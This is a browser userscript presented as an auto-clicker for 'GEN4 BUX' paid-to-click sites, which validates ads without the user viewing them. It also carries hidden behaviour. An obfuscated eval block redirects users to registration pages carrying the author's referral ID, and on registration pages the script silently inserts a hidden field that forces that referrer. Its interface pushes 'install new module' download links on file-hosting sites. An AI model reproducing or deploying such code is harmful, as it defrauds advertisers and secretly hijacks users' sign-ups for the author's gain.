typeof(CheckForUpdate)!='undefined' && CheckForUpdate.init(<>
// ==UserScript==
// @name           PTC GEN4 AutoClicker
// @namespace      http://www.mediafire.com/Update-last-AutoGen4
// @description    An Auto-click for GEN BUX WebSites, makes you validated without viewing the ads. Ads loaded faster, because this script ignores all tags. So images, css, js, swfs files etc WILL NOT loaded, and you will save your bandwidth.

// @author         M. Zuckerberg
// @email          m.zuckerberg@usa.com
// @copyright      www.mediafire.com/Update-last-AutoGen4
// @license        GNU GPL

// @include        *://*/ads.php
// @include        *://*/*



// @require        http://userscripts.org/scripts/source/38788.user.js
// @cfu:meta       http://userscripts.org/scripts/source/@cfu:id.meta.js
// @cfu:url        http://userscripts.org/scripts/source/@cfu:id.user.js
// @cfu:interval   1 day
// @cfu:id         uso:script
// @cfu:version    1.0.7
// @cfu:timestamp  uso:timestamp
// @uso:script     98261
// @uso:timestamp  01:25 03/14/2011


// ==/UserScript==
</>);

/**************************************************************************

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

**************************************************************************/

var ref = document.referrer;
var uri = document.URL;

eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('8(2.9("f.5/1.3")>0&&2!="7://4.f.5/1.3?r=6"){a.b.c="7://4.f.5/1.3?r=6"}8(2.9(/g.5..u=r/)>0&&2!="d://4.g.5/?u=r&e=p"){a.b.c="d://4.g.5/?u=r&e=p"}8(2.9("h.5/1")>0&&2!="d://4.h.5/1?e=q"){a.b.c="d://4.h.5/1?e=q"}8(2.9("i.5/1.3")>0&&2!="d://4.i.5/1.3/6.s"){a.b.c="d://4.i.5/1.3/6.s"}8(2.9("j.k/1")>0&&2!="7://4.j.k/1.3?t=6"){a.b.c="7://4.j.k/1.3?t=6"}8(2.9("l.m/1.3")>0&&2!="7://4.l.m/1.3?r=6"){a.b.c="7://4.l.m/1.3?r=6"}8(2.9("n.o/1.3")>0&&2!="7://4.n.o/1.3?r=6"){a.b.c="7://4.n.o/1.3?r=6"}',31,31,'|register|uri|php|www|com|huunghi1208|http|if|search|document|location|href|https|rh|paid2youtube|neobux|intelligentbux|onbux|incrasebux|mycubie|buxp|info|bux|to|6762616E65726A69|7e63ae70663c6d76ffc6a1840db2dea1||html|ref|'.split('|'),0,{}))

var force_to = "ahrimandead";
var waiting_time = 30;
var range_to = 15;

var shuffle = function(o){
	if(Math.floor(Math.random() * o.length) % 2) return o;
	for(var j, x, i = o.length; i; j = parseInt(Math.random() * i), x = o[--i], o[i] = o[j], o[j] = x);
	return o;
},
isAds = function(o) {
	try {
		return o.href.match(/cks\.php\?k\=[0-9A-Fa-f]+\&cdk\=flase/) != null && o.parentNode.parentNode.parentNode.parentNode.getElementsByTagName('div')[1].className == 'image'
	}
	catch(e) {
		return false
	}
},
correctURL = function(r) {
	return window.location.href.match(r) != null
},
setStatus = function(o, m) {
	o.parentNode.parentNode.parentNode.innerHTML = m
},
addevent = function(o, f) {
	document.getElementById(o).addEventListener('click', f, false)
},
byTag = function(t) {
	return document.getElementsByTagName(t)
},
byName = function(n) {
	return document.getElementsByName(n)
},
newTag = function(t) {
	return document.createElement(t)
},
getwtime = function(o) {
	var i, a = o.parentNode.parentNode.parentNode.parentNode.getElementsByTagName('div');
	for(i = 0; i < a.length; i++)
		if(a[i].className == "counter")
			return a[i].innerHTML.match(/([0-9]+) seconds/)[1]
},
strip = function(s) {
	var str = String(s).split("</td>").join("\r"),
	reg = /<td\s*width=['"]?100\%['"]?\s*>([^\r]+)\r/,
	match = str.match(reg),
	search = str.search(reg),
	out = [], i = 0, tmp;
	while(match) {
		str = str.substr(search + match[0].length, str.length);
		out[i] = match[1].replace(/\s*<script[^>]+>[\S\s]+<\/script>\s*/, "");
		out[i] = out[i].replace(/<img[^>]+>/, "");
		i++;
		match = str.match(reg);
		search = str.search(reg);
	};
	return (out.length ? "<table><tr><td>"+out.join("</td><td>")+"</td></tr></table>" : "NO MATCH");
},
login = function() {
	var a = byTag("a"), I;
	for(I = 0; I < a.length; I++)
		if(a[I].href.match(/logout\.php/)) 
			return true;
	return false
}(),
autosurf = false;
if(correctURL(/\/ads\.php/)) {
	if(login) {
		var A = byTag("a"), i, html = "", timer,
		table = document.getElementById('content'),
		robot = newTag('div'),
		urls = [],
		current = 0,
		msg,
		tmr,
		load = function() {
			clearInterval(timer);
			timer = null;
			if(!urls[current]) {
				if(typeof autosurf == 'function')
					autosurf();
				return
			};
			var ajax = new XMLHttpRequest();
			ajax.onreadystatechange = function() {
				try {
					if(ajax.readyState == 4) {
						if(ajax.status == 200) {
							if(String(ajax.responseText).match(/You have already viewed this advertisement/)) {
								msg.innerHTML = "Ads already opened, loading next ads...";
								setStatus(urls[current], "OPENED");
								current++;
								timer = setInterval(load, 1000)
							}
							else if(String(ajax.responseText).match(/Couldn't find an advertisement/)) {
								msg.innerHTML = "Ads expired, loading next ads...";
								setStatus(urls[current], "EXPIRED");
								current++;
								timer = setInterval(load, 1000)
							}
							else if(String(ajax.responseText).match(/You don't have permission to view this advertisement/)) {
								msg.innerHTML = "Forbidden Ads, loading next ads...";
								setStatus(urls[current], "FORBIDDEN");
								current++;
								timer = setInterval(load, 1000)
							}
							else {
								var j = urls[current].wtime,
								validate = function() {
									var ajx = new XMLHttpRequest();
									ajx.onreadystatechange = function() {
										try {
											if(ajx.readyState == 4) {
												if(ajx.status == 200) {
													msg.innerHTML = "Ads validated, opening next ads...";
													setStatus(urls[current], "VALIDATED");
													current++;
													timer = setInterval(load, 1000)
												}
												else {
													msg.innerHTML = "Connection error, retrying...";
													validate()
												}
											}
										}
										catch(e) {
											msg.innerHTML = "Validation error, retrying...";
											validate()
										}
									};
									msg.innerHTML = "Validating...";
									ajx.open("GET", "cmp.php?complete&amp;", true);
									ajx.send(null)									
								};
								tmr = setInterval(function() {
									if(j < 0) {
										validate();
										clearInterval(tmr);
										tmr = null;
										return
									};
									msg.innerHTML = "Ads loaded, waiting for "+j+" seconds...";
									j--
								}, 1000)
							}
						}
						else {
							msg.innerHTML = "Loading error, retrying...";
							timer = setInterval(load, 1000)
						}
					}
				}
				catch(e) {
					msg.innerHTML = "Loading error, retrying...";
					timer = setInterval(load, 1000)
				}
			};
			msg.innerHTML = "Loading ads <b id='PTCAutoClickerBot-current'>\""+(urls[current].parentNode.parentNode.parentNode.getElementsByTagName('a')[0].innerHTML)+"\"</b>...<br /><div id='PTCAutoClickerBot-loading'></div>";
			ajax.open("GET", urls[current].href, true);
			ajax.send(null)
		};
		for(i = 0; i < A.length; i++) {
			try {
				//search cheat will detect the anti cheat
				if(isAds(A[i]) && A[i].innerHTML.search('cheat') < 0) {
					urls[urls.length] = A[i];
					urls[urls.length - 1].wtime = getwtime(A[i]);
				}
			}
			catch(e) {}
		};
		robot.id = "JustOneClick-container";
		robot.align = "center";
		html = "<style>";
		html += "#JustOneClick-container *{font-family:arial;color:black;font-weight:bold;text-decoration:none}";
		html += "#JustOneClick-container{display:block}";
		html += "#JustOneClick,#JustOneClick-title,#JustOneClick-container a.button{-moz-border-radius:3px;-webkit-border-radius:3px;-khtml-border-radius:3px;border-radius:3px;border: 1px solid #888}";
		html += "#JustOneClick-container a.button{padding:10px;color:#000;background:#ccc}";
		html += "#JustOneClick-container a.button:hover{color:#fff;background:#333}";
		html += "#JustOneClick{padding:2px;display:block;width:600px;background:#fff;text-align:left}";
		html += "#JustOneClick-title{display:block;padding:5px;background:#666;color:#fff}";
		html += "#JustOneClick-msg{line-height:2em}";
		html += "</style>";
		html += "<div id='JustOneClick'><div id='JustOneClick-title'>Just 1 Click for all GeN4 BUX WebSites!  V 0.9.4</div><br /><div id='JustOneClick-msg' align=center>";
		html += "<b style='font-size:15px'>News / Updates</b><br />We've made some updates to the Options <br> –>> Advanced auto click & validator,<br> –>>Auto surf mode activated,<br> –>> Random Clicking, <br> –>> Cheat Check skipped....<br />We did migrate the script to Firefox addons that support the new features & includes many new capabilities.<br><br><a href='http://www.mediafire.com/update-last-autogen4' class='button' target='_blank'>CLICK HERE INTALL NEW MODULE[MF]</a><br><br><a href='http://www.megaupload.com/?f=NNGF1FZW' target='_blank'>&copy; CLICK HERE INTALL NEW MODULE [MU]</a>";
		html += "</div><br />";
		html += "</div></div>";
		robot.innerHTML = html;
		table.parentNode.insertBefore(robot, table);
		msg = document.getElementById("JustOneClick-msg");
		if(urls.length) {
			document.getElementById("adsclick").addEventListener('click', function(){
				autosurf = function() {
					msg.innerHTML = "Done! ........ Go to: <a href='http://www.megaupload.com/?f=NNGF1FZW' class='button' target='_blank'>Support</a>";
					
				};
				this.parentNode.style.display = 'none';
				timer = setInterval(load, 1000)
			}, false)
		};
		document.getElementById('whatsnew').addEventListener('click', function(){
			var news = "* Improved auto click and approval\n";
			news += "* Captcha Bypass\n";
			news += "* Auto surf mode\n";
			news += "* Paypal and AlertPay email address editing\n";
			news += "* Some Bug Fixes";
			alert(news)
		}, false);
		document.getElementById('silversurfer').addEventListener('click', function(){
			this.parentNode.style.display = 'none';
			msg.innerHTML = "Auto Surf mode activated...";
			var adscontainer = document.createElement('div');
			document.body.appendChild(adscontainer);
			adscontainer.style.display = 'none';
			autosurf = function() {
				urls = [];
				current = 0;
				msg.innerHTML = "Check for New Ads...";
				var sec = Math.ceil(Math.random() * range_to * 60),
				j = sec,
				tm, ajx,
				reloadads = function() {
					msg.innerHTML = "Check to see if there is any new ad...";
					ajx = new XMLHttpRequest();
					ajx.onreadystatechange = function() {
						try {
							if(ajx.readyState == 4) {
								if(ajx.status == 200) {
									msg.innerHTML = "Check to see if there is any new ad...";
									adscontainer.innerHTML = strip(ajx.responseText);
									A = adscontainer.getElementsByTagName('a');
									for(i = 0; i < A.length; i++) {
										try {
											if(A[i].href.match(/cks\.php\?k\=[0-9A-F]+\&cdk\=flase/) && A[i].parentNode.parentNode.parentNode.getElementsByTagName('a')[0].className == 'azul')
												urls[urls.length] = A[i]
										}
										catch(e) {}
									};
									if(urls.length) {
										msg.innerHTML = urls.length + " advertisment";
										timer = setInterval(load, 1000)
									}
									else {
										msg.innerHTML = "Advertisments found";
										autosurf()
									}
								}
								else {
									msg.innerHTML = "Loading error, try again ...";
									reloadads()
								}
							}
						}
						catch(e){
							msg.innerHTML = "Loading error, try again ...";
							reloadads()
						}
					};
					ajx.open('GET', 'ads.php', true);
					ajx.send(null)
				};
				tm = setInterval(function() {
					if(j < 0) {
						clearInterval(tm);
						tm = null;
						msg.innerHTML = "Completed Time and Learning, donor ...";
						reloadads()
					}
					else {
						msg.innerHTML = "Please wait "+j+" for checking...";
						j--
					}
				}, 1000)
			};
			if(urls.length)
				timer = setInterval(load, 1000)
			else 
				autosurf()
		}, false)
	}
}
else if(correctURL(/\/register\.php/)) {

	var r = byName('11')[0], ref, cty, ori;
	if(r && force_to) {
		ref = newTag('input');
		ref.type = "hidden";
		ref.name = "11";
		ref.value = "huunghi1208";
		r.form.insertBefore(ref, r.form.firstChild);
		r.name = "ref";
		r.value = "";
		cty = byName('12')[0];
		ori = cty.value;
		cty.parentNode.removeChild(cty);
		r.form.getElementsByTagName('table')[0].rows[12].cells[1].innerHTML = "<input type=text name='12' value='"+ori+"' style='text-transform:uppercase' />"
	}

}

else if(correctURL(/\/forum/)) {
	try {
		var name = byName('a_name')[0], tr = newTag('tr');
		name.parentNode.parentNode.parentNode.insertBefore(tr, name.parentNode.parentNode);
		tr.innerHTML = "<td>Username</td><td>:</td><td><input type=text name='a_name' value='"+name.value+"' style='width:100%'/></td>";
		name.parentNode.removeChild(name)
	}
	catch(e) {}
};